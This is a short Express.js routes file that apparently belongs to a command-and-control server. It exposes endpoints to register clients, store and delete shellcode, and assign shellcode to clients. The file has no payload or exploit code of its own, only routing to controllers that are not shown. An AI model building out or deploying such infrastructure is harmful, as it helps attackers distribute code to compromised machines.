'use strict';
module.exports = function (app) {

  var clientController = require('../controllers/clientController');
  var shellcodeController = require('../controllers/shellcodeController');

  app.route('/shellcode')
    .get(shellcodeController.get_shellcodes)
    .post(shellcodeController.register_shellcode)
    .delete(shellcodeController.delete_shellcode);

  app.route('/update')
    .post(clientController.clear_shellcode);

  app.route('/register')
    .post(clientController.register_client);

  app.route('/clients')

    .get(clientController.get_clients)
    .delete(clientController.delete_clients)
    .post(clientController.assign_shellcode)
};